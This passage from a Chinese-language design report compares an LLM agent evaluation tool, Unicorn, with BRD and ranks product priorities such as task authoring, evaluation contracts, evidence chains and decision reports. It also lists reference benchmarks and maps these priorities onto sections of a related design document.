| 推荐 | — | DSGBench (游戏策略评测) | [letsdatascience.com](https://letsdatascience.com/news/dsgbench-introduces-a-strategic-game-benchmark-for-llm-agent-3ec6abb2) |
| 推荐 | — | Interactive Evaluation Design Science | [hyper.ai](https://hyper.ai/en/papers/2605.17829) |
| 推荐 | LMArena | Chatbot Arena + Elo 排名 | [lmarena.ai](https://lmarena.ai/) |
| 参考 | — | GDPval (Pairwise comparison) | [artificialanalysis.ai](https://artificialanalysis.ai/evaluations/gdpval-aa) |

---

## 6. 结论

**核心判断**：Unicorn 相对 BRD 的优势不是“功能更多”，而是**数据模型和架构假设从根本上正确**。BRD 的 binary 对比 + exact match + 无隔离三个假设会在实际使用真实 agent/skill 时迅速崩溃。

**v3 重排**：本报告现在把 micro-eval 的近期目标明确为**评测决策闭环**，而不是完整 eval 平台。P0 成败不取决于 Bradley-Terry、IRT、AdaptiveScheduler 或 Multi-turn AgentDriver，而取决于用户能否快速写出好 Task、声明清楚 Evaluation Contract、跑出带证据链的 same-start ResultMatrix，并得到一份敢于说“变好 / 变差 / 无法判断”的 Decision Report。

**优先研究 / 设计主题**（按产品闭环影响排序，v3 更新）：
1. **Task Authoring**（4.1）— 决定用户能否把真实改动转成可评测任务
2. **Evaluation Contract**（4.2）— 决定报告是否有明确评判边界
3. **Evidence Chain / ValidationResult**（4.4）— 决定用户是否信任分数与结论
4. **Decision Report**（4.5）— 决定产品是否真的帮助用户行动
5. **Same-start Reproducibility**（4.6）— 决定 run 之间是否可比、结论是否可复现
6. **Cost/Time Guardrails**（4.7）— 决定用户是否愿意跑矩阵与 repetitions
7. **Basic Honest Stats**（4.8）— 决定系统是否诚实暴露“不足以判断”

**明确降级**：多轮 AgentDriver、高级统计 / IRT / Bradley-Terry、record/replay、深度 TraceProvider 归一化、remote sandbox 都仍有价值，但属于 P2/P3。近期只保留扩展点，不让它们阻塞最小决策闭环。

**最大剩余缺口**：不是多轮 agent，也不是统计加强，而是**从真实改动 → 好 Task → Evaluation Contract → Evidence-backed ResultMatrix → Decision Report** 这条链路还没有被产品化。

---

## 纳入状态说明（2026-06-02）

本研究是 `2026-06-02-unicorn-design.md` Part I 模块化重构的**直接依据**，纳入度最高。§3.3 的 8 个 P0 原语已全部映射到设计文档：

| 本文 P0 原语 | 设计文档落点 |
|---|---|
| Task Authoring | §5.1 Asset Layer |
| Evaluation Contract | §5.2 Configuration Layer + §5.7 Evaluation Layer（最小字段已列） |
| Black-box Command Adapter | §5.4 Agent Adapter Layer |
| Evidence Chain | §6 Evidence Model（独立成章） |
| Decision Report | §5.8 Decision Layer + verdict taxonomy |
| Same-start Reproducibility | §5.5 + §7 Snapshot Comparability Gate |
| Cost/Time Guardrails | §5.2 / §5.5 GuardrailPolicy（见下偏差） |
| Basic Honest Stats | §5.7 / §8 Maturity |

§4.10 的 Deferred 清单与设计文档 §8 Maturity / §15"不做"一致；§3.6 反目标也已贯彻（无通用 observability、无高级统计平台）。

**唯一偏轻**：Cost/Time Guardrails 的 **run 前/中/后三段式细节**（本文 §4.7）在设计文档中仅以 GuardrailPolicy + §9 MVP 要点概述，未完全展开，建议实现阶段回填。